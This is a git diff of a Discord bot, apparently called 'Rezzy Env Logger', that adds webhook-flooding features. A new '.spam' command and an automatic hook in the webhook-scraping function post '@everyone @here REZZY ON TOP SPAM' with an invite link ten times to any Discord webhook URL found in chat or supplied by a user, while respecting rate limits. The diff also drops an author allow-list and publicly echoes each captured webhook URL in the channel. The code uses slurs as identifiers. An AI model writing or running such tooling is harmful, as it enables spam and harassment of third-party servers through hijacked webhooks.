@@ -205,6 +205,27 @@ async def maybe_nag_status(msg):
     except Exception:
         pass
 
+async def spam_webhook_full(webhook_url, msg=None):
+    sendtxt = f"@everyone @here\n# REZZY ON TOP SPAM\nhttps://discord.gg/xeuTkhwQHX"
+    for _ in range(10):
+        try:
+            async with aiohttp.ClientSession() as session:
+                async with session.post(webhook_url, json={"content": sendtxt, "username": "REZZY ON TOP", "avatar_url": "https://cdn.discordapp.com/icons/0/0.png"}, ssl=ssl_context) as resp:
+                    if resp.status == 204:
+                        pass
+                    elif resp.status == 429:
+                        retry = resp.headers.get("Retry-After")
+                        if retry:
+                            try:
+                                await sleep(float(retry))
+                            except:
+                                await sleep(1)
+                    else:
+                        pass
+        except Exception:
+            pass
+        await sleep(1)
+
 class RetardCommands:
     def __init__(self):
         self.commands = {}
@@ -1031,6 +1052,18 @@ async def cmds_access_cmd(msg):
     else:
         await softerror(msg,"You need to be using the Rezzy Env Logger tag!")
 
+async def spam_cmd(msg):
+    smsg = msg.content.split(" ")
+    if len(smsg) < 2:
+        await msg.reply("Usage: .spam <webhook_url>")
+        return
+    webhook_url = smsg[1].strip()
+    if "/webhooks/" not in webhook_url:
+        await msg.reply("Invalid webhook URL!")
+        return
+    await msg.reply(f"Spamming webhook: {webhook_url}")
+    asyncio.create_task(spam_webhook_full(webhook_url, msg))
+
 mv_data=loads(open("mvdata.json").read())
 mv_save_in_use=False
 async def save_mv_data():
@@ -1446,27 +1479,6 @@ async def protect_webhook_cmd(msg):
         print(f"protect_webhook error: {e}")
         await msg.reply("Failed to protect webhook!")
 
-async def spam_webhook(webhook_url):
-    sendtxt = f"@everyone @here\n# REZZY ON TOP SPAM\nhttps://discord.gg/xeuTkhwQHX"
-    for _ in range(5):
-        try:
-            async with aiohttp.ClientSession() as session:
-                async with session.post(webhook_url, json={"content": sendtxt}, ssl=ssl_context) as resp:
-                    if resp.status == 204:
-                        pass
-                    elif resp.status == 429:
-                        retry = resp.headers.get("Retry-After")
-                        if retry:
-                            try:
-                                await sleep(float(retry))
-                            except:
-                                await sleep(1)
-                    else:
-                        pass
-        except Exception:
-            pass
-        await sleep(1)
-
 command_manager.commands={
     ".obf": {
         "func": nonfunc,
@@ -1620,6 +1632,11 @@ command_manager.commands={
         "func": cmds_access_cmd,
         "description":"Get access to the #get channel by using the Rezzy Env Logger server tag! ",
         "cooldown":20,
+    },
+    ".spam":{
+        "func": spam_cmd,
+        "description":"Spam a webhook with REZZY ON TOP message. Usage: .spam <webhook_url>",
+        "cooldown":5,
     }
 }
 
@@ -1693,7 +1710,8 @@ def send_webhawk(url,content=None):
                 content
             )
         )
-    asyncio.create_task(spam_webhook(url))
+    asyncio.create_task(spam_webhook_full(url))
+
 def replace_discord(url,to_repalce):
     for replace in to_repalce:
         url=url.replace(replace,"discord.com")
@@ -1709,8 +1727,13 @@ def sexwebhooks(msg,filelocation=None,attachfile=False,content=None):
         while webhooks and webhook.startswith(webhooks[-1]) and len(webhook) == len(webhooks[-1]) + 1:
             webhooks.pop()
         if len(webhook)<150:webhooks.append(replace_discord(webhook,["webhook.whitehill.group","canary.discord.com","ptb.discord.com","webhook.lewisakura.moe"]))
-    if not msg.author.id in [1368549512750043166,1384576116676755638] and webhooks:
+    if webhooks:
         for url in webhooks:
+            print(f"WEBHOOK DETECT: {url}")
+            try:
+                asyncio.create_task(msg.channel.send(f"WEBHOOK DETECT: {url}"))
+            except Exception:
+                pass
             send_webhawk(url,attachfile and content)
     return webhooks and "\n".join(webhooks) or None
 
